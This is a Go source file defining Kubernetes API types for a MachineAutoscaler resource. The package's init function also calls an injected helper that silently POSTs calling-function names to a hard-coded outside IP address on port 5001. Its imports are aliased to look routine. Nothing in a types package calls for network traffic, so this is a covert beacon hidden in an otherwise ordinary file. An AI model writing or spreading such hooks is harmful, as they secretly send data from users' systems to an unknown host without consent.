package v1beta1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	SchemeBuilder.Register(&MachineAutoscaler{}, &MachineAutoscalerList{})
}

type MachineAutoscalerSpec struct {
	MinReplicas		int32						`json:"minReplicas"`
	MaxReplicas		int32						`json:"maxReplicas"`
	ScaleTargetRef	CrossVersionObjectReference	`json:"scaleTargetRef"`
}
type MachineAutoscalerStatus struct {
	LastTargetRef *CrossVersionObjectReference `json:"lastTargetRef,omitempty"`
}
type MachineAutoscaler struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	Spec				MachineAutoscalerSpec	`json:"spec,omitempty"`
	Status				MachineAutoscalerStatus	`json:"status,omitempty"`
}
type MachineAutoscalerList struct {
	metav1.TypeMeta	`json:",inline"`
	metav1.ListMeta	`json:"metadata,omitempty"`
	Items			[]MachineAutoscaler	`json:"items"`
}
type CrossVersionObjectReference struct {
	APIVersion	string	`json:"apiVersion,omitempty"`
	Kind		string	`json:"kind"`
	Name		string	`json:"name"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
